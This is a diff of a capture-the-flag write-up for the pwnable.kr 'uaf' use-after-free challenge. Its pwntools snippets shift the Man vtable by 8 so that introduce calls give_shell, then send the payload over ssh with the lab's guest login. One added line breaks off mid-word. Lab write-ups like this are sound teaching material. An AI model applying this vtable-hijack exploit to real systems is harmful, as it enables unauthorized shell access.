@@ -14,6 +14,11 @@ Note: first function in the vtable is after a 0x10 offset. In the heap, it is ``
 
 If we decrease ``(vtable+0x10)`` address by 8, trying to call ``m->introduce`` will result in calling ``m->give_shell``.
 
+Let's load the binary to get the Man vtable address.
+```python
+from pwn import *
+elf = ELF("uaf")
+```
 first function of the old vtable (give_shell) :
 ```python
 old_vtable_1F =  elf.symbols["_ZTV3Man"]+0x10
@@ -23,9 +28,8 @@ give_shell takes the place of introduce as second function :
 new_vtable_1F =  old_vtable_1F-8
 ```
 
+Now let's write th
 ```python
-from pwn import *
-elf = ELF("uaf")
 shell = ssh("uaf", "pwnable.kr", password="guest", port=2222)
 wp = shell.process(["cat", "/dev/stdin", ">>", "/tmp/payload"])
 wp.send(p64(new_vtable_1F))
